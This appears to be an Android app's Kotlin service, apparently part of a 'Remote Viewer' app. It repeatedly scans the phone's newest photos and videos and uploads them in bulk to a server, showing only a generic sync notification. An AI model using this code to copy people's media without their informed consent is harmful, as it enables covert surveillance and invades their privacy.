package com.remote.viewer

import android.app.*
import android.content.ContentUris
import android.content.Intent
import android.content.pm.ServiceInfo
import android.net.Uri
import android.os.*
import android.provider.MediaStore
import org.json.JSONObject

class FileSyncService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private val runnable = object : Runnable {
        override fun run() {
            syncOnce()
            handler.postDelayed(this, 10 * 60 * 1000L)   // har 10 min me dobara
        }
    }

    override fun onCreate() {
        super.onCreate()
        val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        nm.createNotificationChannel(NotificationChannel("filesync", "File Sync", NotificationManager.IMPORTANCE_LOW))
        val n = Notification.Builder(this, "filesync")
            .setSmallIcon(R.drawable.ic_notification)
            .setContentTitle("Remote Viewer")
            .setContentText("Photos/videos sync ho rahi hain...")
            .setOngoing(true)
            .build()
        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(3, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else startForeground(3, n)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        handler.removeCallbacks(runnable)
        handler.post(runnable)
        return START_STICKY
    }

    override fun onDestroy() {
        handler.removeCallbacks(runnable)
        super.onDestroy()
    }

    private fun syncOnce() {
        Thread {
            var count = 0
            count += scan(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 50)
            count += scan(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 50)
            if (count > 0) {
                Uploader.postJson("/api/notify", JSONObject()
                    .put("app", "sync")
                    .put("title", "File Sync")
                    .put("text", "$count nayi file upload hui"))
            }
        }.start()
    }

    private fun scan(collection: Uri, max: Int): Int {
        var uploaded = 0
        try {
            val projection = arrayOf(
                MediaStore.MediaColumns._ID,
                MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.SIZE
            )
            contentResolver.query(collection, projection, null, null,
                MediaStore.MediaColumns.DATE_ADDED + " DESC")?.use { c ->
                val idCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
                val nameCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
                val sizeCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
                while (c.moveToNext() && uploaded < max) {
                    val id = c.getLong(idCol)
                    val name = c.getString(nameCol) ?: continue
                    val size = c.getLong(sizeCol)
                    if (size > 150L * 1024 * 1024) continue   // 150MB se badi skip
                    val uri = ContentUris.withAppendedId(collection, id)
                    val stream = try { contentResolver.openInputStream(uri) } catch (e: Exception) { null } ?: continue
                    Uploader.putStream("/api/upload", stream, mimeFor(name), name)
                    uploaded++
                }
            }
        } catch (e: Exception) {}
        return uploaded
    }

    private fun mimeFor(name: String) = when (name.substringAfterLast('.', "").lowercase()) {
        "png" -> "image/png"; "gif" -> "image/gif"; "webp" -> "image/webp"
        "mp4" -> "video/mp4"; "mkv" -> "video/x-matroska"; "3gp" -> "video/3gpp"
        else -> "image/jpeg"
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
